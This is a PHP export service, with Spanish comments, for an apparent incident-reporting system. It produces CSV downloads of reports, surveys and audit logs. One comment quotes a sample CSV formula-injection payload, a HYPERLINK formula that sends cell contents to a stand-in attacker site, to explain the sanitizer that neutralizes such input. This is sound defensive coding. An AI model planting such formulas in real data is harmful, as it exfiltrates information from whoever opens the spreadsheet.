<?php
// Servicio de Exportación (RF-26: Exportar a PDF/Excel)
// v1.0: CSV (compatible con Excel)
// v2.0: PDF + XLSX con PHPOffice/PhpSpreadsheet

class ServicioExportacion {

    /**
     * Techo de filas por exportación.
     *
     * No es paginación: es un tope de seguridad. Las consultas no tenían
     * ninguno, así que una institucion con años de historial generaba un
     * archivo que crecía sin límite y una petición que podia tardar lo que
     * quisiera. Con cincuenta mil filas el archivo ronda los 15 MB, que ya es
     * mas de lo que nadie abre comodamente en una hoja de calculo.
     */
    const MAX_FILAS = 50000;

    private $bd;
    private $id_institucion;

    public function __construct($id_institucion) {
        $this->bd = BaseDatos::obtener();
        $this->id_institucion = $id_institucion;
    }

    /**
     * Exportar reportes a CSV (Excel-compatible)
     * RFC-26: Exportación de reportes con filtros
     */
    /** SQL y parámetros del informe de reportes, sin ORDER BY ni LIMIT. */
    private function consulta_reportes($filtros = []) {
        $sql = 'SELECT
                    r.numero_ticket,
                    r.fecha_hora_registro,
                    CASE WHEN r.id_estado = 1 THEN "Registrado"
                         WHEN r.id_estado = 2 THEN "Asignado"
                         WHEN r.id_estado = 3 THEN "En Proceso"
                         WHEN r.id_estado = 4 THEN "Solucionado"
                         WHEN r.id_estado = 5 THEN "En Validación"
                         WHEN r.id_estado = 6 THEN "Devuelto"
                         WHEN r.id_estado = 7 THEN "Cerrado"
                         ELSE "Anulado" END as estado,
                    CASE WHEN r.id_urgencia_calculada = 1 THEN "No Urgente"
                         WHEN r.id_urgencia_calculada = 2 THEN "Moderado"
                         WHEN r.id_urgencia_calculada = 3 THEN "Importante"
                         ELSE "Urgente" END as urgencia,
                    r.descripcion_problema,
                    r.nombre_reportante as reportante,
                    CASE WHEN r.es_anonimo = 1 THEN "Anónimo" ELSE r.correo_reportante END as contacto,
                    r.fecha_actualizacion
                FROM reporte r
                WHERE r.id_institucion = :id_institucion';

        $parametros = [':id_institucion' => $this->id_institucion];

        // Aplicar filtros
        if (!empty($filtros['id_estado'])) {
            $sql .= ' AND r.id_estado = :id_estado';
            $parametros[':id_estado'] = $filtros['id_estado'];
        }

        if (!empty($filtros['fecha_desde'])) {
            $sql .= ' AND DATE(r.fecha_hora_registro) >= :fecha_desde';
            $parametros[':fecha_desde'] = $filtros['fecha_desde'];
        }

        if (!empty($filtros['fecha_hasta'])) {
            $sql .= ' AND DATE(r.fecha_hora_registro) <= :fecha_hasta';
            $parametros[':fecha_hasta'] = $filtros['fecha_hasta'];
        }

        return [$sql, $parametros];
    }

    public function exportar_reportes_csv($filtros = []) {
        [$sql, $parametros] = $this->consulta_reportes($filtros);
        $sql .= ' ORDER BY r.fecha_hora_registro DESC LIMIT ' . self::MAX_FILAS;

        $reportes = $this->bd->obtener_todos($sql, $parametros);

        // Generar CSV
        $csv = $this->generar_csv($reportes, self::COLUMNAS_REPORTES);

        return $csv;
    }

    /** Columnas del informe de reportes, compartidas por ambos caminos. */
    const COLUMNAS_REPORTES = [
        'numero_ticket', 'fecha_hora_registro', 'estado', 'urgencia',
        'descripcion_problema', 'reportante', 'contacto', 'fecha_actualizacion',
    ];

    /**
     * Igual que exportar_reportes_csv(), pero enviando el archivo mientras se
     * lee, en vez de armarlo entero en memoria y mandarlo al final.
     *
     * La diferencia que nota una persona no es la memoria —medido: cincuenta
     * mil filas ocupan 64 MB y el límite del servidor son 2 GB— sino que el
     * navegador empieza a recibir el archivo de inmediato. Antes se quedaba
     * mirando una pantalla en blanco hasta que la última fila estuviera lista.
     *
     * Termina la petición: no devuelve nada.
     */
    public function descargar_reportes_csv($filtros = [], $nombre_archivo = null) {
        [$sql, $parametros] = $this->consulta_reportes($filtros);
        $sql .= ' ORDER BY r.fecha_hora_registro DESC LIMIT ' . self::MAX_FILAS;

        $stmt = $this->bd->ejecutar($sql, $parametros);
        $salida = self::abrir_descarga($nombre_archivo ?: ('reportes_' . date('Y-m-d') . '.csv'));

        fwrite($salida, $this->fila_csv(array_combine(
            self::COLUMNAS_REPORTES, self::COLUMNAS_REPORTES
        ), self::COLUMNAS_REPORTES));

        $n = 0;
        while ($fila = $stmt->fetch(PDO::FETCH_ASSOC)) {
            fwrite($salida, $this->fila_csv($fila, self::COLUMNAS_REPORTES));

            // Empujar al navegador cada tanto para que vea progreso, sin
            // pagar un vaciado de búfer por cada fila.
            if (++$n % 500 === 0) {
                flush();
            }
        }

        fclose($salida);
        exit;
    }

    /** Cabeceras HTTP + BOM. Devuelve el manejador donde escribir el CSV. */
    private static function abrir_descarga($nombre_archivo) {
        // Sin esto, PHP acumularía toda la salida y el flujo no serviría de nada.
        while (ob_get_level() > 0) {
            ob_end_flush();
        }

        header('Content-Type: text/csv; charset=utf-8');
        header('Content-Disposition: attachment; filename="' . $nombre_archivo . '"');
        header('Cache-Control: no-store, no-cache, must-revalidate');
        header('X-Content-Type-Options: nosniff');

        $salida = fopen('php://output', 'w');
        fwrite($salida, "\xEF\xBB\xBF"); // BOM para Excel

        return $salida;
    }

    /** Una fila ya escapada, con salto de línea. */
    private function fila_csv(array $fila, array $columnas) {
        $valores = [];
        foreach ($columnas as $col) {
            $valores[] = '"' . $this->escapar_csv($fila[$col] ?? '') . '"';
        }

        return implode(',', $valores) . "\n";
    }

    /**
     * Exportar estadísticas de SLA
     */
    public function exportar_estadisticas_sla() {
        // El estado 6 es Devuelto, no Cerrado. Este informe contaba los
        // devueltos como cerrados, así que en producción decía "0 cerrados"
        // con cinco reportes cerrados, y dejaba fuera de "activos" todo lo que
        // estuviera en Solucionado, En Validación o Devuelto.
        //
        // Se usan las constantes en vez de números sueltos justamente para que
        // esto no vuelva a pasar.
        $sql = 'SELECT
                    COUNT(*) as total_reportes,
                    SUM(CASE WHEN id_estado = ' . ESTADO_CERRADO . ' THEN 1 ELSE 0 END) as cerrados,
                    SUM(CASE WHEN id_estado = ' . ESTADO_ANULADO . ' THEN 1 ELSE 0 END) as anulados,
                    SUM(CASE WHEN id_estado NOT IN (' . ESTADO_CERRADO . ', ' . ESTADO_ANULADO . ') THEN 1 ELSE 0 END) as activos,
                    ROUND(AVG(DATEDIFF(
                        COALESCE(fecha_hora_cierre, NOW()), fecha_hora_registro
                    )), 2) as promedio_dias,
                    SUM(CASE WHEN id_urgencia_calculada = ' . URGENCIA_URGENTE . ' THEN 1 ELSE 0 END) as urgentes
                FROM reporte
                WHERE id_institucion = :id_institucion';

        $stats = $this->bd->obtener_uno($sql, [':id_institucion' => $this->id_institucion]);

        return $stats;
    }

    /**
     * Exportar encuestas de satisfacción
     */
    public function exportar_encuestas_csv() {
        $sql = 'SELECT
                    r.numero_ticket,
                    r.descripcion_problema,
                    e.puntuacion,
                    CASE WHEN e.puntuacion >= 4 THEN "Satisfecho" ELSE "Insatisfecho" END as satisfaccion,
                    e.comentario,
                    e.fecha_completada
                FROM encuesta_satisfaccion e
                JOIN reporte r ON e.id_reporte = r.id_reporte
                WHERE e.id_institucion = :id_institucion
                AND e.fue_respondida = 1
                ORDER BY e.fecha_completada DESC
                LIMIT ' . self::MAX_FILAS;

        $encuestas = $this->bd->obtener_todos($sql, [':id_institucion' => $this->id_institucion]);

        return $this->generar_csv($encuestas, ['numero_ticket', 'descripcion_problema', 'puntuacion', 'satisfaccion', 'comentario', 'fecha_completada']);
    }

    /**
     * Exportar auditoria (misma data que la vista de Auditoría: registro_auditoria)
     */
    public function exportar_auditoria_csv($fecha_desde = null, $fecha_hasta = null, $incluir_globales = false) {
        $sql = 'SELECT
                    DATE_FORMAT(a.fecha_hora_accion, "%Y-%m-%d %H:%i:%s") AS fecha,
                    CASE WHEN a.id_usuario IS NULL THEN "Sistema"
                         ELSE COALESCE(u.nombre_completo, CONCAT("Usuario #", a.id_usuario)) END AS usuario,
                    a.accion,
                    a.entidad,
                    COALESCE(a.id_entidad, "") AS id_entidad,
                    COALESCE(a.ip_origen, "") AS ip,
                    COALESCE(a.datos_anteriores_json, "") AS antes,
                    COALESCE(a.datos_nuevos_json, "") AS despues
                FROM registro_auditoria a
                LEFT JOIN usuario u ON a.id_usuario = u.id_usuario
                WHERE ' . ($incluir_globales ? '(a.id_institucion = :id_institucion OR a.id_institucion IS NULL)' : 'a.id_institucion = :id_institucion');

        $parametros = [':id_institucion' => $this->id_institucion];

        if ($fecha_desde) {
            $sql .= ' AND DATE(a.fecha_hora_accion) >= :fecha_desde';
            $parametros[':fecha_desde'] = $fecha_desde;
        }

        if ($fecha_hasta) {
            $sql .= ' AND DATE(a.fecha_hora_accion) <= :fecha_hasta';
            $parametros[':fecha_hasta'] = $fecha_hasta;
        }

        $sql .= ' ORDER BY a.fecha_hora_accion DESC, a.id_auditoria DESC LIMIT ' . self::MAX_FILAS;

        $auditoria = $this->bd->obtener_todos($sql, $parametros);

        return $this->generar_csv($auditoria, ['fecha', 'usuario', 'accion', 'entidad', 'id_entidad', 'ip', 'antes', 'despues']);
    }

    /**
     * Helper: Generar CSV desde array
     */
    private function generar_csv($datos, $columnas) {
        $csv = '';

        // Encabezados
        $csv .= implode(',', array_map(fn($col) => '"' . $this->escapar_csv($col) . '"', $columnas)) . "\n";

        // Filas
        foreach ($datos as $fila) {
            $valores = [];
            foreach ($columnas as $col) {
                $valores[] = '"' . $this->escapar_csv($fila[$col] ?? '') . '"';
            }
            $csv .= implode(',', $valores) . "\n";
        }

        return $csv;
    }

    /**
     * Helper: Escapar valores CSV
     */
    private function escapar_csv($valor) {
        return str_replace('"', '""', $this->neutralizar_formula((string) $valor));
    }

    /**
     * Impide que una celda se convierta en fórmula al abrir el archivo.
     *
     * Excel y LibreOffice evalúan cualquier celda que empiece por =, +, - o @.
     * Las comillas del CSV no protegen: el programa las quita al importar y
     * después interpreta el contenido.
     *
     * Esto importa aquí más que en otros sitios porque descripcion_problema lo
     * escribe un ciudadano anónimo, sin cuenta, desde el formulario público.
     * Le basta con escribir
     *
     *     =HYPERLINK("http://sitio-atacante/?f="&A1,"Ver la foto")
     *
     * y esperar a que alguien de la institución exporte el listado: quien abra
     * el archivo ve un enlace con aspecto legítimo que, al pulsarlo, manda el
     * contenido de otra celda a un servidor ajeno. Hay variantes que llegan a
     * lanzar programas.
     *
     * El arreglo estándar es anteponer un apóstrofo, que el programa de hoja
     * de calculo consume y trata el resto como texto.
     *
     * Los números negativos se dejan en paz: -2 empieza por - pero es un
     * número, y convertirlo en texto rompería cualquier suma de la hoja.
     */
    private function neutralizar_formula($valor) {
        if ($valor === '') {
            return $valor;
        }

        // Un número de verdad no es una fórmula.
        if (is_numeric($valor)) {
            return $valor;
        }

        $primero = $valor[0];
        $peligrosos = ['=', '+', '-', '@', "	", "
"];

        return in_array($primero, $peligrosos, true) ? "'" . $valor : $valor;
    }

    /**
     * Descargar archivo CSV
     */
    public static function descargar_csv($contenido, $nombre_archivo) {
        header('Content-Type: text/csv; charset=utf-8');
        header('Content-Disposition: attachment; filename="' . $nombre_archivo . '"');
        header('Pragma: no-cache');
        header('Expires: 0');

        echo "\xEF\xBB\xBF"; // BOM para Excel
        echo $contenido;
        exit;
    }
}
